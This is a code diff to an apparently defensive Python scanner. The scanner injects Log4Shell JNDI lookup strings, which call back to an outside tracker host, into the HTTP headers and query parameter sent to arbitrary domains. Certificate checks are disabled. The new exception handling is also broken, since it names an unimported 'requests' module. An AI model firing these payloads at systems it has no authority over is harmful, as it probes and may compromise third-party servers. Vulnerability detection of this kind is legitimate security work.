@@ -1,5 +1,6 @@
 import time
 import functools
+import base64
 import json
 import argparse, sys
 import logging
@@ -7,6 +8,7 @@ import asyncio
 import os
 import signal
 import traceback
+import hashlib
 import random
 import string
 import datetime as dt
@@ -14,6 +16,8 @@ from operator import itemgetter
 from concurrent.futures import TimeoutError, ProcessPoolExecutor
 from requests import get
 from nats.aio.client import Client as NATS
+import urllib3
+urllib3.disable_warnings()
 
 logging.basicConfig(stream=sys.stdout, level=logging.INFO)
 
@@ -30,16 +34,22 @@ def randomword(length):
     letters = string.ascii_lowercase
     return ''.join(random.choice(letters) for i in range(length))
 
+def payload(domain, header):
+    hashed_domain = hashlib.md5(domain.encode('utf-8')).hexdigest()
+    encoded_header = base64.b64encode(header.encode('utf-8')).decode('utf-8').rstrip('=')
+    return "${jndi:ldap://" + f"{hashed_domain}.{encoded_header}" + "t.log4shell.tracker.alpha.canada.ca}"
+
 def log4shell(domain):
+    fakedomain = randomword(10)
     try:
-        payload = "${jndi:ldap://" + randomword(10) + "t.log4shell.tracker.alpha.canada.ca}"
-        params = {'id':payload}
-        headers = {'User-Agent':payload, 'Referer':payload, 'X-Api-Version': payload}
-        print(f'Testing https://{domain}')
-        get(f"https://{domain}", headers=headers, params=params, verify=False, timeout=1)
-        get(f"http://{domain}", headers=headers, params=params, verify=False, timeout=1)
-    except Exception as e:
-        print(e)
+        params = {'id': payload(fakedomain, "params-id")}
+        headers = {'User-Agent':payload(fakedomain, "User-Agent"), 'Referer':payload(fakedomain, "Referer"), 'X-Api-Version': payload(fakedomain, "X-Api-Version")}
+        response = get(f"http://{domain}", headers=headers, params=params, verify=False, timeout=1)
+        if response.history == []:
+            response = get(f"https://{domain}", headers=headers, params=params, verify=False, timeout=1)
+        to_json({'domain': domain, 'status': response.status_code, 'redirects': list(map(lambda res: res.url, response.history))})
+    except requests.RequestException as e:
+        to_json({'exception': True, 'status': e.response.status_code, 'text': e.response.text})
         pass
 
 
